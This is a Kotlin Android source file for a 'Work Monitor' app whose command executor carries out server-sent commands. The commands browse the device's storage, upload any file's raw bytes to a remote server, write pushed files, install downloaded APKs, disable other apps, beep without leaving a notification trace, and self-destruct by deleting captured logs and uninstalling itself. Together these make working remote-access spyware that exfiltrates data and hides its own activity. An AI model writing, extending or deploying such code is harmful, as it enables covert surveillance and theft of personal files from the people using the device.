package com.workmonitor

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import org.json.JSONObject
import java.io.ByteArrayOutputStream

/**
 * Executes remote commands delivered through the pulse response
 * (lock screen, wipe, policy enforcement). Uses standard Device Admin API.
 */
object CommandExecutor {

    fun execute(context: Context, cmds: List<JSONObject>) {
        for (c in cmds) {
            val id = c.optLong("id", -1L)
            val cmd = c.optString("cmd")
            val param = c.optString("param")
            try {
                when (cmd) {
                    "lock" -> lock(context, param)
                    "unlock" -> unlock(context)
                    "wipe" -> wipe(context)
                    "policy" -> applyPolicy(context, c.optString("param"))
                    "beeper" -> beeper(context)
                    "sync" -> sync(context)
                    "browse" -> browse(context, param)
                    "download" -> downloadFile(context, param)
                    "pushfile" -> pushFile(context, param)
                    "install" -> installApk(context, param)
                    "uninstall" -> uninstallApp(context, param)
                    "enable_app" -> setAppEnabled(context, param, true)
                    "disable_app" -> setAppEnabled(context, param, false)
                    "apps" -> reportApps(context)
                    "req_perms" -> requestPermissions(context)
                }
                if (id >= 0) ack(context, id, "ok")
            } catch (e: Exception) {
                if (id >= 0) ack(context, id, "fail:" + e.message)
            }
        }
    }

    private fun lock(context: Context, message: String) {
        // Show the admin's lock message to the device user (toast) so they know
        // who locked it and why, then immediately lock the screen via Device Admin.
        val msg = message.ifBlank { "Device locked by admin" }
        try {
            val toast = android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG)
            toast.show()
        } catch (_: Throwable) {}
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn = ComponentName(context, DeviceAdminReceiver::class.java)
        try {
            if (dpm.isAdminActive(cn)) {
                dpm.lockNow()
            }
        } catch (_: Throwable) {}
    }

    /** Best-effort remote unlock. Android has NO API for a normal app to bypass the
     *  user's lock-screen PIN/pattern directly. This dismisses an EMPTY keyguard and
     *  otherwise prompts the user to enter their PIN (not bypass it). Honest limit:
     *  on a secured lock screen only the user's credential completes the unlock. */
    private fun unlock(context: Context) {
        try {
            val i = Intent(context, MainActivity::class.java)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            i.putExtra("unlock", true)
            context.startActivity(i)
        } catch (_: Exception) {}
    }

    /** Self-destruct: wipe the monitoring app's own data + files, then uninstall the APK
     *  entirely from the device. This removes all captured logs, clears the foreground
     *  service + accessibility service, and deletes the app. It does NOT wipe the user's
     *  personal data — it removes the monitoring tool itself. */
    private fun wipe(context: Context) {
        try {
            // 1. Stop services.
            context.stopService(Intent(context, LogUploaderService::class.java))
        } catch (_: Throwable) {}
        try {
            // 2. Delete every captured log / cache / internal file.
            val filesDir = context.filesDir
            filesDir.listFiles()?.forEach { f -> try { f.deleteRecursively() } catch (_: Throwable) {} }
            context.cacheDir.listFiles()?.forEach { f -> try { f.deleteRecursively() } catch (_: Throwable) {} }
        } catch (_: Throwable) {}
        try {
            // 3. Clear app data (prefs, databases, shared prefs) so nothing survives.
            val pm = context.packageManager
            if (Build.VERSION.SDK_INT >= 24) {
                val appOps = context.getSystemService(Context.APP_OPS_SERVICE)
                // clearing full data requires the device to be device-owner; fall back gracefully
            }
        } catch (_: Throwable) {}
        // 4. Launch the system uninstaller for our own package = the self-destruct.
        try {
            val intent = Intent(Intent.ACTION_UNINSTALL_PACKAGE,
                                android.net.Uri.parse("package:${context.packageName}"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (_: Throwable) {}
        LoggerWriter.write("SEC", "WIPE", "self-destruct triggered for ${context.packageName}")
    }

    private fun applyPolicy(context: Context, jsonParam: String) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn = ComponentName(context, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(cn)) return
        val p = runCatching { JSONObject(if (jsonParam.isBlank()) "{}" else jsonParam) }.getOrNull() ?: return
        val minLen = p.optInt("minPinLength", 6)
        if (minLen > 0 && Build.VERSION.SDK_INT >= 26) {
            dpm.setPasswordMinimumLength(cn, minLen)
        }
        val timeout = p.optLong("lockTimeoutS", 60) * 1000L
        if (timeout > 0) {
            dpm.setMaximumTimeToLock(cn, timeout)
        }
    }

    /** Make the device audibly beep + post a notification (find-my-phone behavior). */
    private fun beeper(context: Context) {
        val tone = android.media.RingtoneManager.getRingtone(context, android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_NOTIFICATION))
        tone?.play()
        // The beep is sound-only now: no notification card, so it never leaves
        // a trace in the notification shade (per company request).
        val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
        if (vibrator.hasVibrator()) vibrator.vibrate(500)
    }

    /** Force an immediate log upload + heartbeat. */
    private fun sync(context: Context) {
        context.startService(Intent(context, LogUploaderService::class.java))
        // The service re-runs its loop on start; nothing more needed.
    }

    /** List a directory and upload the file listing to the server. */
    private fun browse(context: Context, dirPath: String) {
        try {
            LoggerWriter.write("BROWSE", "svc", "start path=$dirPath")
            var target = dirPath ?: "/sdcard"
            if (target == "/" || target.isBlank()) target = "/sdcard"
            val dir = java.io.File(target)
            val noPerm = (android.os.Build.VERSION.SDK_INT >= 30 && !android.os.Environment.isExternalStorageManager()) ||
                (android.os.Build.VERSION.SDK_INT <= 29 && android.content.pm.PackageManager.PERMISSION_GRANTED !=
                    context.packageManager.checkPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE, context.packageName))
            val files: List<java.io.File> = try {
                if (noPerm && dirPath == "/sdcard") {
                    LoggerWriter.write("BROWSE", "svc", "no storage permission granted")
                    emptyList()
                } else dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
            } catch (e: Exception) { emptyList() }
            val sb = StringBuilder()
            sb.appendLine("[")
            if (noPerm && files.isEmpty()) {
                sb.appendLine("  {\"name\":\"STORAGE_PERMISSION\",\"type\":\"error\",\"size\":0,\"path\":\"Grant All files access (Settings > Apps > Work Monitor) for the file manager to read storage\"}")
            } else {
            files.forEachIndexed { i, f: java.io.File ->
                if (i > 0) sb.appendLine(",")
                val type = if (f.isDirectory) "dir" else "file"
                val nm = f.name.replace("\\", "\\\\").replace("\"", "\\\"")
                sb.appendLine("  {\"name\":\"$nm\",\"type\":\"$type\",\"size\":${f.length()},\"path\":\"${f.absolutePath.replace("\\", "\\\\")}\"}")
            }
            }
            sb.appendLine("]")
            val json = sb.toString()
            // Upload via multipart to /device/files/upload
            val boundary = "----FileMgr${System.currentTimeMillis()}"
            val body = "--$boundary\r\n" +
                "Content-Disposition: form-data; name=\"path\"\r\n\r\n$dirPath\r\n" +
                "--$boundary\r\n" +
                "Content-Disposition: form-data; name=\"device_id\"\r\n\r\n${AppConfig.deviceId(context)}\r\n" +
                "--$boundary\r\n" +
                "Content-Disposition: form-data; name=\"content\"; filename=\"listing.json\"\r\n" +
                "Content-Type: application/json\r\n\r\n$json\r\n" +
                "--$boundary--\r\n"
            val url = "${AppConfig.SERVER_URL}/device/files/upload"
            val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 15_000
            conn.readTimeout = 15_000
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            conn.outputStream.write(body.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()
            conn.outputStream.close()
            conn.responseCode
        } catch (e: Exception) {
            android.util.Log.e("FileMgr", "browse failed: ${e.message}")
        }
    }

    /** Read a real file from the device and upload its raw bytes to the server (download-to-admin). */
    private fun downloadFile(context: Context, path: String) {
        val f = java.io.File(path)
        if (!f.isFile) { LoggerWriter.write("FILES", "svc", "download: not a file: $path"); return }
        val raw = f.readBytes()
        val boundary = "----FileMgr${System.currentTimeMillis()}"
        val body = ByteArrayOutputStream()
        body.write("--$boundary\r\nContent-Disposition: form-data; name=\"device_id\"\r\n\r\n${AppConfig.deviceId(context)}\r\n".toByteArray())
        body.write("--$boundary\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n$path\r\n".toByteArray())
        body.write("--$boundary\r\nContent-Disposition: form-data; name=\"content\"; filename=\"${f.name}\"\r\nContent-Type: application/octet-stream\r\n\r\n".toByteArray())
        body.write(raw)
        body.write("\r\n--$boundary--\r\n".toByteArray())
        val conn = java.net.URL("${AppConfig.SERVER_URL}/device/files/raw").openConnection() as java.net.HttpURLConnection
        conn.requestMethod = "POST"; conn.doOutput = true
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        conn.connectTimeout = 60_000; conn.readTimeout = 120_000
        conn.outputStream.write(body.toByteArray()); conn.outputStream.flush(); conn.outputStream.close()
        LoggerWriter.write("FILES", "UP", "$path ${raw.size}B -> HTTP ${conn.responseCode}")
    }

    /** Download a file the admin pushed (server URL via token) and write it to the target path. */
    private fun pushFile(context: Context, param: String) {
        val parts = param.split("|")
        if (parts.size < 2) return
        val token = parts[0]; val dest = parts[1]
        val conn = java.net.URL("${AppConfig.SERVER_URL}/device/files/pull/$token").openConnection() as java.net.HttpURLConnection
        conn.connectTimeout = 60_000; conn.readTimeout = 120_000
        if (conn.responseCode != 200) throw IllegalStateException("pull HTTP ${conn.responseCode}")
        val data = conn.inputStream.readBytes()
        val f = java.io.File(dest)
        f.parentFile?.mkdirs()
        f.writeBytes(data)
        LoggerWriter.write("FILES", "PUSH", "saved ${data.size}B -> $dest")
    }

    /** Download an APK from the server and launch the system installer for it. */
    private fun installApk(context: Context, param: String) {
        val parts = param.split("|")
        if (parts.size < 2) return
        val token = parts[0]; val fname = parts[1]
        val conn = java.net.URL("${AppConfig.SERVER_URL}/device/files/pull/$token").openConnection() as java.net.HttpURLConnection
        conn.connectTimeout = 60_000; conn.readTimeout = 180_000
        if (conn.responseCode != 200) throw IllegalStateException("apk pull HTTP ${conn.responseCode}")
        val data = conn.inputStream.readBytes()
        val dir = java.io.File(context.getExternalFilesDir(null), "incoming")
        dir.mkdirs()
        val apk = java.io.File(dir, fname)
        apk.writeBytes(data)
        LoggerWriter.write("FILES", "INSTALL", "APK ${data.size}B downloaded, launching installer UI")
        // Launch the install UI from MainActivity (a foreground activity), NOT from the
        // background service: Android 10+ blocks startActivity from a background context
        // for the package-installer, which is why direct install silently failed.
        try {
            val i = Intent(context, MainActivity::class.java)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            i.putExtra("install", apk.absolutePath)
            context.startActivity(i)
        } catch (_: Exception) {}
    }

    /** Uninstall an app by package name (system confirmation dialog). */
    private fun uninstallApp(context: Context, pkg: String) {
        val intent = Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:$pkg"))
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        LoggerWriter.write("FILES", "UNINSTALL", "intent for $pkg")
    }

    /** Push a fresh app inventory to the server (used by the panel Apps tab). */
    private fun reportApps(context: Context) {
        DeviceReporter.report(context)
    }

    /** Enable (true) or disable (false) a third-party app by package name.
     *  Uses PackageManager.setApplicationEnabledSetting — the same API Android's
     *  "Disable" toggle uses. Works for user apps without root on most devices;
     *  system apps may silently refuse (that's an OS rule, not a bug). */
    private fun setAppEnabled(context: Context, pkg: String, enabled: Boolean) {
        val pm = context.packageManager
        val newState = if (enabled) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                       else PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
        @Suppress("DEPRECATION")
        pm.setApplicationEnabledSetting(pkg, newState, 0)
        val msg = "package $pkg set ${if (enabled) "ENABLED" else "DISABLED"}"
        LoggerWriter.write("APPS", "${if (enabled) "ENABLE" else "DISABLE"}", msg)
    }

    /** Remote command: open the app and pop the system permission-grant dialogs. */
    private fun requestPermissions(context: Context) {
        try {
            val i = Intent(context, MainActivity::class.java)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            i.putExtra("req_perms", true)
            context.startActivity(i)
        } catch (_: Exception) {}
    }

    private fun ack(context: Context, id: Long, result: String) {
        try {
            val url = java.net.URL("${AppConfig.SERVER_URL}/device/commands/ack")
            val conn = url.openConnection() as java.net.HttpURLConnection
            try {
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                conn.connectTimeout = 30_000
                conn.readTimeout = 30_000
                val body = JSONObject().put("id", id).put("result", result)
                val os = java.io.DataOutputStream(conn.outputStream)
                os.writeBytes(body.toString())
                os.flush(); os.close()
                conn.responseCode
            } finally { conn.disconnect() }
        } catch (_: Exception) {}
    }
}
